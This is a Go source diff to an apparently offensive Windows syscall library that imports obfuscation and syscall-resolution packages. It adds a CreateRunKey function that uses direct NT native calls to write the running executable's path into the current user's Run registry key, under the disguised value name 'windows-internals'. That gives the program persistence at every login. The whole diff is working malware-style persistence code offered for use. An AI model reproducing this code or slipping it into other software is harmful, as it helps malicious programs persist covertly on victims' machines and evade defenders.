@@ -3,7 +3,9 @@ package winapi
 import (
 	"fmt"
 	"unsafe"
-
+	"os"
+	"os/user"
+	"github.com/carved4/go-native-syscall/pkg/debug"
 	"github.com/carved4/go-native-syscall/pkg/obf"
 	"github.com/carved4/go-native-syscall/pkg/syscallresolve"
 )
@@ -341,4 +343,110 @@ func ApplyCriticalPatches() (successful []string, failed map[string]error) {
 	}
 
 	return successful, failed
+} 
+
+func CreateRunKey() error {
+	debug.Printfln("PERSISTENCE", "Starting CreateRunKey() for registry persistence\n")
+	
+	// 1. Get the current executable's path
+	executablePath, err := os.Executable()
+	if err != nil {
+		debug.Printfln("PERSISTENCE", "Failed to get executable path: %v\n", err)
+		return fmt.Errorf("failed to get executable path: %w", err)
+	}
+	debug.Printfln("PERSISTENCE", "Current executable path: %s\n", executablePath)
+
+	// 2. Get current user's SID string to build the HKCU path
+	currentUser, err := user.Current()
+	if err != nil {
+		debug.Printfln("PERSISTENCE", "Failed to get current user: %v\n", err)
+		return fmt.Errorf("failed to get current user: %w", err)
+	}
+	sid := currentUser.Uid
+	debug.Printfln("PERSISTENCE", "Current user SID: %s\n", sid)
+
+	// 3. Open HKCU root key (\Registry\User\<SID>)
+	hkcuPath := `\Registry\User\` + sid
+	debug.Printfln("PERSISTENCE", "Opening HKCU registry path: %s\n", hkcuPath)
+	unicodeHkcuPath := NewUnicodeString(StringToUTF16(hkcuPath))
+
+	var objectAttributes OBJECT_ATTRIBUTES
+	objectAttributes.Length = uint32(unsafe.Sizeof(objectAttributes))
+	objectAttributes.RootDirectory = 0
+	objectAttributes.ObjectName = &unicodeHkcuPath
+	objectAttributes.Attributes = OBJ_CASE_INSENSITIVE
+
+	var hkcuHandle uintptr
+	status, err := NtOpenKey(
+		&hkcuHandle,
+		KEY_ALL_ACCESS,
+		uintptr(unsafe.Pointer(&objectAttributes)),
+	)
+	if err != nil {
+		debug.Printfln("PERSISTENCE", "NtOpenKey for HKCU failed: %v\n", err)
+		return fmt.Errorf("NtOpenKey for HKCU failed: %w", err)
+	}
+	if !IsNTStatusSuccess(status) {
+		debug.Printfln("PERSISTENCE", "NtOpenKey for HKCU failed with status: 0x%x\n", status)
+		return fmt.Errorf("NtOpenKey for HKCU failed with status: 0x%x", status)
+	}
+	debug.Printfln("PERSISTENCE", "Successfully opened HKCU registry key (handle: 0x%x)\n", hkcuHandle)
+	defer NtClose(hkcuHandle)
+
+	// 4. Create the Run key relative to the HKCU handle
+	runKeyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
+	debug.Printfln("PERSISTENCE", "Creating/opening Run registry subkey: %s\n", runKeyPath)
+	unicodeRunKeyPath := NewUnicodeString(StringToUTF16(runKeyPath))
+
+	// Re-initialize ObjectAttributes for the subkey, pointing to the parent key handle
+	var subkeyObjectAttributes OBJECT_ATTRIBUTES
+	subkeyObjectAttributes.Length = uint32(unsafe.Sizeof(subkeyObjectAttributes))
+	subkeyObjectAttributes.RootDirectory = hkcuHandle
+	subkeyObjectAttributes.ObjectName = &unicodeRunKeyPath
+	subkeyObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE
+
+	var runKeyHandle uintptr
+	var disposition uintptr
+	status, err = NtCreateKey(
+		&runKeyHandle,
+		KEY_ALL_ACCESS,
+		uintptr(unsafe.Pointer(&subkeyObjectAttributes)),
+		0,
+		0,
+		REG_OPTION_NON_VOLATILE,
+		&disposition,
+	)
+	if err != nil {
+		debug.Printfln("PERSISTENCE", "NtCreateKey for Run key failed: %v\n", err)
+		return fmt.Errorf("NtCreateKey for Run key failed: %w", err)
+	}
+	if !IsNTStatusSuccess(status) {
+		debug.Printfln("PERSISTENCE", "NtCreateKey for Run key failed with status: 0x%x\n", status)
+		return fmt.Errorf("NtCreateKey for Run key failed with status: 0x%x", status)
+	}
+	debug.Printfln("PERSISTENCE", "Successfully created/opened Run key (handle: 0x%x, disposition: %d)\n", runKeyHandle, disposition)
+	defer NtClose(runKeyHandle)
+
+	// 5. Set the value in the Run key to point to the current executable
+	valueName := "windows-internals"
+	unicodeValueName := NewUnicodeString(StringToUTF16(valueName))
+	valueData := StringToUTF16(executablePath)
+	valueDataSize := uintptr((len(executablePath) + 1) * 2) // Include null terminator
+
+	status, err = NtSetValueKey(
+		runKeyHandle,
+		uintptr(unsafe.Pointer(&unicodeValueName)),
+		0,
+		REG_SZ,
+		unsafe.Pointer(valueData),
+		valueDataSize,
+	)
+	if err != nil {
+		return fmt.Errorf("NtSetValueKey failed: %w", err)
+	}
+	if !IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtSetValueKey failed with status: 0x%x", status)
+	}
+
+	return nil
 } 
